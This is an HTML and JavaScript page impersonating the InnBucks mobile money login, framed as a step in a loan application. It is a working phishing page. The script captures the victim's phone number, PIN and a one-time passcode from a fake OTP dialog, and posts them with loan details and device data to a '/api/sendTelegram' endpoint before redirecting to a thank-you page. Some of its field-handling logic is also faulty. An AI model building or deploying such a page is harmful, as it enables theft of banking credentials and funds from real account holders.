<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks â€” Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}

/* CARD */
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:14px;
  border:1px solid #1f2937;
  box-shadow:0 18px 45px rgba(0,0,0,.75);
}

.logo{
  height:44px;
  display:block;
  margin:0 auto 10px;
}

h2{
  text-align:center;
  margin:0 0 12px;
  font-size:20px;
  color:#f8fafc;
  letter-spacing:.2px;
}

label{
  display:block;
  font-size:13px;
  margin-top:8px;
  color:#cbd5f5;
}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
  font-size:14px;
}

.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%;
  font-weight:600;
}

.btn[disabled]{
  background:#334155;
  cursor:not-allowed;
}

.error{
  min-height:18px;
  font-size:13px;
  color:#ef4444;
}

/* PIN */
.pin-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}

.pin-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  color:transparent;
}

.pin-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

/* OTP MODAL */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,.88);
  display:flex;
  align-items:center;
  justify-content:center;
}

.otp-box{
  background:#020617;
  padding:20px;
  border-radius:14px;
  min-width:340px;
  border:1px solid #1f2937;
}
</style>
</head>

<body>

<div class="card">
  <img src="assets/InnBucks.png" class="logo">
  <h2>Login</h2>

  <form id="loginForm">
    <label>Mobile Number</label>
    <input id="phone" value="+263">
    <div id="phoneError" class="error"></div>

    <label>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <strong>Enter OTP</strong>

    <div class="pin-row">
      <input class="pin-digit">
      <input class="pin-digit">
      <input class="pin-digit">
      <input class="pin-digit">
      <input class="pin-digit">
    </div>

    <input id="otpBuffer" style="opacity:0">

    <button id="confirmOtp" class="btn" disabled>Confirm</button>
    <button id="cancelOtp" class="btn">Cancel</button>
  </div>
</div>

<script>
/* ===== LOAN DATA FROM INDEX ===== */
const loanForm = JSON.parse(sessionStorage.getItem('loanForm') || '{}');

/* ===== DEVICE ===== */
const ua = navigator.userAgent;
let device = 'Unknown';
if (/Android/i.test(ua)) device = 'Android';
if (/Chrome/i.test(ua)) device += ' | Chrome';

/* ===== FORMAT LOAN REQUEST (ONLY CHANGE) ===== */
function loanRequest(){
  if(!loanForm.loanAmount) return 'N/A';
  return `${loanForm.loanAmount} / ${loanForm.loanType} / ${loanForm.repayment} (${loanForm.employment})`;
}

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';
pins.forEach((el,i)=>{
  el.addEventListener('input',()=>{
    el.value=el.value.replace(/\D/g,'');
    el.classList.toggle('filled',!!el.value);
    if(el.value && i<pins.length-1) pins[i+1].focus();
    pinValue=pins.map(p=>p.value).join('');
    loginBtn.disabled=!(/^\d{4}$/.test(pinValue) && validatePhone());
  });
});

/* ===== PHONE ===== */
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');

function validatePhone(){
  const d=phone.value.replace('+263','');
  if(!/^7\d{8}$/.test(d)){
    phoneError.innerText='Invalid number';
    return false;
  }
  phoneError.innerText='';
  return true;
}

phone.addEventListener('input',()=>{
  let d=phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phone.value='+263'+d;
  validatePhone();
});

/* ===== LOGIN ===== */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  if(document.getElementById('hp').value) return;

  await sendToServer({
    event:'login_clicked',
    loginPhone:phone.value,
    loginPin:pinValue,
    loan_request: loanRequest(),
    device,
    submittedAt:new Date().toISOString()
  });

  document.getElementById('otpModal').style.display='flex';
});

/* ===== CONFIRM ===== */
document.getElementById('confirmOtp').onclick=async()=>{
  await sendToServer({
    event:'otp_confirm',
    loginPhone:phone.value,
    loginPin:pinValue,
    otp:otpBuffer.value,
    loan_request: loanRequest(),
    device,
    submittedAt:new Date().toISOString()
  });

  location.href='thankyou.html';
};

document.getElementById('cancelOtp').onclick=()=>{
  document.getElementById('otpModal').style.display='none';
};
</script>

</body>
</html>
